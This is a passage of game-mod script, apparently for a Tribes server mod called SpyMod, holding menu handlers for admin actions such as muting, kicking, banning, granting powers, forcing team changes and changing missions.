    bottomprint(%clientId, "<jc><f1>Your prefences have been reset to the default");
  }

  if (%opt == "addbuddy") {
    if ((%name = Client::getName(%sel)) != "") {
      SpyModClientScript::addBuddy(%clientId, %name);
      Client::sendMessage(%clientId, 1, "\"" @ %name @ "\" has been added to your buddy list.");
    }
  }
}

function processMenuPunishOptions(%clientId, %option) {
  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);

  if (%opt == "adminmute") {
    if (!Admin::hasPrivilege(%clientId, "mute")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use admin\\moderator-only feature: mute", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    Client::buildMenu(%clientId, "Mute " @ Client::getName(%cl), "AdminMute", true);
    Client::addMenuItem(%clientId, "160 second mute" , %cl @ " 60");
    Client::addMenuItem(%clientId, "2120 second mute", %cl @ " 120");
    Client::addMenuItem(%clientId, "3Cancel"         , %cl @ " cancel");
    return;
  }
  if (%opt == "adminunmute") {
    if (!Admin::hasPrivilege(%clientId, "mute")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use admin\\moderator-only feature: unmute", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    Client::buildMenu(%clientId, "Unmute " @ Client::getName(%cl), "AdminMute", true);
    Client::addMenuItem(%clientId, "1Yes", %cl @ " unmute");
    Client::addMenuItem(%clientId, "2No" , %cl @ " cancel");
    return;
  }
  if (%opt == "kick") {
    if (!Admin::hasPrivilege(%clientId, "kick")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: kick", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    Client::buildMenu(%clientId, "Confirm kick:", "kaffirm", true);
    Client::addMenuItem(%clientId, "1Kick " @ Client::getName(%cl), "yes " @ %cl);
    Client::addMenuItem(%clientId, "2Don't kick " @ Client::getName(%cl), "no " @ %cl);
    return;
  }
  if (%opt == "ban") {
    if (!Admin::hasPrivilege(%clientId, "ban")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use an superadmin-only feature: ban", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    Client::buildMenu(%clientId, "Confirm Ban:", "baffirm", true);
    Client::addMenuItem(%clientId, "1Ban " @ Client::getName(%cl), "yes " @ %cl);
    Client::addMenuItem(%clientId, "2Don't ban " @ Client::getName(%cl), "no " @ %cl);
    return;
  }
  if (%opt == "report") {
    if (!Admin::hasPrivilege(%clientId, "report")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use admin\\moderator-only feature: report", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    bottomprint(%clientId, "<jc><f1>Say what you are reporting " @ Client::getName(%cl) @ " for (your chat is blocked)", 30, true);
    %clientId.reportClient = %cl;
    %clientId.redirectChat = "Admin::moderatorReportInput";
    return;
  }
  if (%opt == "annoy") {
    if (!Admin::hasPrivilege(%clientId, "annoyMenu")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use admin\\moderator-only feature: report", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    Menu::annoyMenu(%clientId);
  }
  if (%opt == "back") {
    Menu::manageMenu(%clientId);
    return;
  }

  Menu::punishMenu(%clientId);
}

function processMenuAnnoyOptions(%clientId, %opt) {
  if (!Admin::hasPrivilege(%clientId, "annoyMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an superadmin-only feature: annoy menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %ch = getWord(%opt, 0);
  %cl = getWord(%opt, 1);

  if (%ch == "blind") {
    if (!%cl.blinded) AdminPower::blind(%cl, %clientId);
    else              AdminPower::unblind(%cl, %clientId);
  }
  if (%ch == "bigmouth") {
    if (!%cl.bigmouth) AdminPower::bigmouth(%cl, %clientId);
    else               AdminPower::unbigmouth(%cl, %clientId);
  }
  if (%ch == "jitter") {
    if (!%cl.jitter) AdminPower::jitter(%cl, %clientId);
    else             AdminPower::unjitter(%cl, %clientId);
  }
  if (%ch == "aimoff") {
    if (!%cl.aimOff) AdminPower::aimOff(%cl, %clientId);
    else             AdminPower::unaimOff(%cl, %clientId);
  }
  if (%ch == "back") {
    Menu::punishMenu(%clientId);
    return;
  }

  Menu::annoyMenu(%clientId);
}

function processMenuCheatOptions(%clientId, %option) {
  if (!Admin::hasPrivilege(%clientId, "cheatMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an superadmin-only feature: cheat menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);

  if (%opt == "invis") {
    if (!%cl.invis) AdminPower::invisibility(%cl, %clientId);
    else            AdminPower::uninvisibility(%cl, %clientId);
  }
  if (%opt == "invinc") {
    if (!%cl.invinc) AdminPower::invincibility(%cl, %clientId);
    else             AdminPower::uninvincibility(%cl, %clientId);
  }
  if (%opt == "mg28") {
    if (Player::getItemCount(%cl, MG28) == 0) {
      Admin::messageAdminsExcept(Client::getName(%clientId) @ " gave " @ Client::getName(%cl) @ " the MG28", %cl);
      Client::sendMessage(%cl, 1, Client::getName(%clientId) @ " just gave you an MG28! W00T!");
      Player::setItemCount(%cl, MG28, 1);
    } else {
      Admin::messageAdminsExcept(Client::getName(%clientId) @ " took " @ Client::getName(%cl) @ "'s MG28", %cl);
      Client::sendMessage(%cl, 1, Client::getName(%clientId) @ " took away your MG28! :'(");
      Player::setItemCount(%cl, MG28, 0);
    }
  }
  if (%opt == "back") {
    Menu::manageMenu(%clientId);
    return;
  }

  Menu::cheatMenu(%clientId);
}

function processMenuManagePowers(%clientId, %option) {
  if (!Admin::hasPrivilege(%clientId, "modifyPowers")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: manage powers", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %cl = getWord(%option, 0);
  %powers = getWord(%option, 1);
  %wordlc = tern(%powers > 0, "grant", "strip");

  if (!Powers::areValidPowers(abs(%powers))) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to " @ %wordlc @ " invalid power(s)", "ban 180");
    return;
  }

  %word = tern(%powers > 0, "Grant", "Strip");
  %powerNames = Powers::getNames(abs(%powers));

  Client::buildMenu(%clientId, "Confirm " @ %wordlc @ " powers:", "mpaffirm", true);
  Client::addMenuItem(%clientId, "1Permanently " @ %word @ " " @ tern(%powers > 0, "to", "from") @ " " @ Client::getName(%cl), "yes " @ %cl @ " " @ %powers);
  Client::addMenuItem(%clientId, "2Cancel", "no " @ %cl);
}



function processMenuFPickTeam(%clientId, %team) {
   if (Admin::hasPrivilege(%clientId, "forceTeamChange"))
      processMenuPickTeam(%clientId.ptc, %team, %clientId);
   %clientId.ptc = "";
}

function processMenuPickTeam(%clientId, %team, %adminClient) {
  checkPlayerCash(%clientId);

  if (%team < -2 || %team >= getNumTeams()) {
//    H4XX0R::hackerDetected(%clientId, "Trying to join non-existant team", "ban 300");
    return;
  }
  if (%adminClient != "" && !Admin::hasPrivilege(%adminClient, "forceTeamChange")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: force teamchange", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  if (%team != -1 && %team == Client::getTeam(%clientId))
    return;

  if (%adminClient == "" && %clientId.teamChangeCount >= 3) {
    if (%clientId.teamChangeCounter > 3)
      schedule("Net::kick("@%clientId@", \"You have been kicked for teamchanging too many times\");",0);
    else
      Client::sendMessage(%clientId, 1, "You can't teamchange now, try again later");
    return;
  }

  if ($Admin::enforceFairTeams && %team >= 0 && !%adminClient) {
    if (!TeamBalance::canPlayerSwitchToTeam(Client::getTeam(%clientId), %team)) {
      Client::sendMessage(%clientId, 1, "You can't switch to team " @ $teamName[%team] @ ", fair teams enforcement is currently ON and switching would imbalance the teams.");
      return;
    }
  }

  if (%clientId.observerMode == "justJoined") {
    %clientId.observerMode = "";
    centerprint(%clientId, "");
  }

  if ((!$matchStarted || !$Server::TourneyMode || %adminClient) && %team == -2) {
    if (Observer::enterObserverMode(%clientId)) {
      %clientId.notready = "";
      if (%adminClient == "")
        messageAll(0, Client::getName(%clientId) @ " became an observer.");
      else
        messageAll(0, Client::getName(%clientId) @ " was forced into observer mode by " @ Client::getName(%adminClient) @ ".");
      Game::resetScores(%clientId);	
      Game::refreshClientScore(%clientId);
    }
    return;
  }

  %player = Client::getOwnedObject(%clientId);
  if (%player != -1 && getObjectType(%player) == "Player" && !Player::isDead(%player)) {
    playNextAnim(%clientId);
    Player::kill(%clientId);
  }
  %clientId.observerMode = "";
  if (%adminClient == "")
    messageAll(0, Client::getName(%clientId) @ " changed teams.");
  else
    messageAll(0, Client::getName(%clientId) @ " was teamchanged by " @ Client::getName(%adminClient) @ ".");

  if(%team == -1) {
    Game::assignClientTeam(%clientId);
    %team = Client::getTeam(%clientId);
  }
  GameBase::setTeam(%clientId, %team);
  %clientId.teamEnergy = 0;

  %clientId.teamChangeCount++;
  %clientId.teamChangeCounter += 4;
  schedule(%clientId @ ".teamChangeCount--;", 60);
  schedule(%clientId @ ".teamChangeCounter -= 3;", 10);
  schedule(%clientId @ ".teamChangeCounter--;", 60);

  Client::clearItemShopping(%clientId);
  if (Client::getGuiMode(%clientId) != 1)
    Client::setGuiMode(%clientId,1);		
  Client::setControlObject(%clientId, -1);

  Game::playerSpawn(%clientId, false);
  %team = Client::getTeam(%clientId);
  if ($TeamEnergy[%team] != "Infinite")
    $TeamEnergy[%team] += $InitialPlayerEnergy;

  if ($Server::TourneyMode && !$CountdownStarted) {
    bottomprint(%clientId, "<f1><jc>Press FIRE when ready.", 0);
    %clientId.notready = true;
  }
}

function processMenuCMType(%clientId, %options) {
   %curItem = 0;
   %option = getWord(%options, 0);
   %first = getWord(%options, 1);
   %admin = getWord(%options, 2);
   if (getWord($MLIST::MissionList[%option], %first) == -1) return;

   Client::buildMenu(%clientId, "Pick Mission", "cmission", true);

   %end = true;
   %num = 0;
   for (%i = 0; (%misIndex = getWord($MLIST::MissionList[%option], %first + %i)) != -1; %i++) {
      if (%num > 6) {
         Client::addMenuItem(%clientId, %i+1 @ "More missions...", "more " @ %first + %i @ " " @ %option @ " " @ %admin);
         %end = false;
         break;
      }
      if (Server::isValidMission(%misIndex) || %admin) {
        Client::addMenuItem(%clientId, %i+1 @ $MLIST::EName[%misIndex], %misIndex @ " " @ %option @ " " @ %admin);
        %num++;
      }
   }// @ %option @ " "
   if (%end && %first != 0) {
     Client::addMenuItem(%clientId, (%i+1)@"Back to start...", "more 0 " @ %option @ " " @ %admin);
   }
}

function processMenuCMission(%clientId, %option) {
  if (getWord(%option, 0) == "more") {
    %first = getWord(%option, 1);
    %type = getWord(%option, 2);
    %admin = getWord(%option, 3);
    processMenuCMType(%clientId, %type @ " " @ %first @ " " @ %admin);
    return;
  }
  %mi = getWord(%option, 0);
  %mt = getWord(%option, 1);
  %admin = getWord(%option, 2);

  %misName = $MLIST::EName[%mi];
  %misType = $MLIST::Type[%mt];

  if (!Server::isSpyModMissionType(%mt)) return; //%misType != SpyModMission) return;

  // verify that this is a valid mission:
  if (%misType == "" || %misType == "Training")
    return;
  for (%i = 0; true; %i++) {
    %misIndex = getWord($MLIST::MissionList[%mt], %i);
    if (%misIndex == %mi)
      break;
    if (%misIndex == -1)
      return;
  }
  if (Admin::hasPrivilege(%clientId, "changeMission") && %admin) {
    messageAll(0, Client::getName(%clientId) @ " changed the mission to " @ %misName @ " (" @ String::getSubStr(%misType, 6, 1024) @ ")");
    Vote::changeMission();
    Server::loadMission(%misName);
  } else {
    Admin::startVote(%clientId, "change the mission to " @ %misName @ " (" @ String::getSubStr(%misType, 6, 1024) @ ")", "cmission", %misName);
    Game::menuRequest(%clientId);
  }
}

function processMenuWallOfN00bsOptions(%clientId, %option) {
  %opt = getWord(%option, 0);
  %arg = getWord(%option, 1);
  %arg2 = getWord(%option, 2);

  if (%opt == "view") {
    if (%arg >= $H4XX0R::numHackers || %arg < 0 || floor(%arg) != %arg) {
      H4XX0R::hackerDetected(%clientId, "Trying to hack the Wall of N00b Hackers, you n00b.", $H4XX0RPunishment::menuHack);
      return;
    }
    Menu::wallOfN00bsMenu(%clientId, %arg);
    return;
  }
  if (%opt == "viewn00b") {
    remoteEval(%clientId, "setInfoLine", 1, "Info about the N00b");
    remoteEval(%clientId, "setInfoLine", 2, "Name: " @ $H4XX0R::hackers[%arg, "name"]);
    remoteEval(%clientId, "setInfoLine", 3, "IP: " @ $H4XX0R::hackers[%arg, "ip"]);
    remoteEval(%clientId, "setInfoLine", 4, "Hacking attempt: " @ String::getSubStr($H4XX0R::hackers[%arg, "reason"], 0, 33));
    remoteEval(%clientId, "setInfoLine", 5, String::getSubStr($H4XX0R::hackers[%arg, "reason"], 33, 50));
    Menu::wallOfN00bsMenu(%clientId, %arg2);
    return;
  }
}

function processMenuHelp(%clientId, %opt) {
  if (%opt == "training") { Menu::trainingMenu(%clientId); return; }
  if (%opt == "passwordhelp") { Help::passwordHelp(%clientId); return; }
  if (%opt == "modinfo") { Help::modInfo(%clientId); return; }
  if (%opt == "bindhelp") { Help::bindHelp(%clientId); return; }
}





// Affirm-type menu processors





function processMenuAdminMute(%clientId, %opt) {
   if (!Admin::hasPrivilege(%clientId, "mute")) {
     //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin\\moderator-only feature: mute", $H4XX0RPunishment::adminOnlyAccess);
     return;
   }

   %cl = getWord(%opt, 0);
   %arg = getWord(%opt, 1);

   if (Client::getName(%cl) == "") {
     Game::menuRequest(%clientId);
     return;
   }

   if (%arg == "cancel") {
     Game::menuRequest(%clientId);
     return;
   } else if (%arg == "unmute") {
     Admin::unmute(%cl, %clientId);
   } else {
     Admin::mute(%cl, %arg, %clientId);
   }

   Menu::punishMenu(%clientId);
}

function processMenuMPAffirm(%clientId, %opt) {
   %ch = getWord(%opt, 0);
   %cl = getWord(%opt, 1);
   %powers = getWord(%opt, 2);
   %powerNames = Powers::getNames(abs(%powers));

   if (!Powers::areValidPowers(abs(%powers))) {
     //H4XX0R::hackerDetected(%clientId, "Attempting to grant\\strip non-existant powers", $H4XX0RPunishment::adminOnlyAccess);
     return;
   }

   %oldPowers = PlayerDatabase::getPowers(%cl.databaseIndex, true);

   if (Client::getName(%cl) == "") {
     Game::menuRequest(%clientId);
     return;
   }

   if (%ch == "yes") {
     if (%powers > 0) {
       DatabaseAdmin::permaGrantPowers(%cl.databaseIndex, %powers, %clientId, Client::getName(%cl));
     } else {
       %powers = -%powers;
       DatabaseAdmin::permaStripPowers(%cl.databaseIndex, %powers, %clientId, Client::getName(%cl));
     }
   }
   Menu::managePowersMenu(%clientId);
}

function processMenuCTLimit(%clientId, %opt) {
  if (%opt == "back") { Menu::adminMenu(%clientId); return; }
  remoteSetTimeLimit(%clientId, %opt);
}
